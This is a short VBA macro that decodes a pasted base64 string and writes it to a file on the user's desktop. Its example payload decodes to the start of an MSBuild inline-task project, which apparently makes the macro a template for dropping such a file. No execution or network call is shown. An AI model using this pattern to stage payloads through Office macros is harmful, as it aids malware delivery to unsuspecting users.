Sub TestDecodeToFile()

    Dim strTempPath As String
    Dim base As String

    'PLACE BASE64 ENCODED FILE IN BETWEEN THE LINES
    '----------------------------------------------------------------------------------'
    
    'example:
    Dim var1
    base = base + "PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3Nv"
    base = base + "ZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgogIDwhLS0gVGhpcyBpbmxpbmUgdGFzayBl"

    '----------------------------------------------------------------------------------'
    'SPECIFY THE PATH BELOW WHERE YOU WANT TO PLACE BASE64 DECODED FILE
    
    strTempPath = "C:\Users\[REDACTED]\Desktop\temp.txt"

    '----------------------------------------------------------------------------------'
    Open strTempPath For Binary As #1
       Put #1, 1, DecodeBase64(base)
    Close #1   
    

End Sub

Private Function DecodeBase64(ByVal strData As String) As Byte()

    Dim objXML As Object 'MSXML2.DOMDocument
    Dim objNode As Object 'MSXML2.IXMLDOMElement

    'get dom document
    Set objXML = CreateObject("MSXML2.DOMDocument")

    'create node with type of base 64 and decode
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue

    'clean up
    Set objNode = Nothing
    Set objXML = Nothing

End Function



